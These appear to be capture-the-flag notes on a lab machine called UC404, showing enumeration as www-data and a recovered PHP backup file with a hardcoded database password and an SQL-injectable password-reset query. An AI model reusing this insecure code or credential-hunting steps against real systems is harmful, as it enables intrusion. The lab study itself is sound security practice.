# 3 box enum www-data

```
www-data@UC404:/home/brian$ cd /tmp
www-data@UC404:/tmp$ ls -la
total 20
drwxrwxrwt  3 root     root     4096 Sep  8 15:48 .
drwxr-xr-x 18 root     root     4096 Oct 20  2020 ..
-rw-rw----  1 www-data www-data   59 Sep  8 14:46 adminer.invalid
-rw-rw----  1 www-data www-data  401 Sep  8 13:18 adminer.version

www-data@UC404:/tmp$ cat adminer.version
a:2:{s:9:"signature";s:344:"GiPxUGEMmriNQOjeQZec/6XaQqiYCO7N5hML0GeG3WSri0ByL/ywzAnVKn28JvqZw78+N1eenJr4UpColdxbOvHaHcTz8OpNOQ9cU6HclcIWtHW/6wZdRosM5xZGbMM3fdwFcQQia5+Y2kz5QLdcGl2szCiIAhjGuUdJeu1Hgg5o5ZtSV0i9A/IlZpRb6GAqjSqHtR0mamVNvVj6FDGLiJ47bcS3Qr+9MsUDYuqMlEWZotMHIyDJ8AoN4ory2uPAfMEvzuBFzU+1/3JPiY9jdcJnRdlTi6Xj/95zmHnqt0CBxqoxIzsBuHz3yqwptObWc608MzUCOyQRhkKG1IX8jQ==";s:7:"version";s:5:"4.8.1";}
```

## PEAS

```
╣ Users with console
brian:x:1001:1001:,,,:/home/brian:/bin/bash
root:x:0:0:root:/root:/bin/bash

# nothing interesting
```

## manual enum

```
www-data@UC404:$cat /var/backups/sendmail.php.bak
<?php 
if(isset($_POST['submit'])) 
{ 
$connect=mysql_connect("localhost","brian","BrianIsOnTheAir789") or die("Could not connect to database");
mysql_select_db("uc404") or die(mysql_error()); 
$email = $_POST['email']; 
$sql= "SELECT  `password` FROM `register` WHERE `email` ='.$email.'"; 
$query = mysql_query($sql); 
if(!$query)  
    { 
    die(mysql_error()); 
    } 
if(mysql_affected_rows() != 0) 
    { 
$row=mysql_fetch_array($query); 
$password=$row["password"]; 
$email=$row["email"]; 
$subject="UC404 - Password Reset"; 
$header="From: webmaster@uc404.local"; 
$content="Your password is ".$password; 
mail($email, $subject, $content, $header);  
print "An email containing the password has been sent to you"; 
    } 
else  
    { 
    echo("User not found."); 
    } 
} 
?>
```
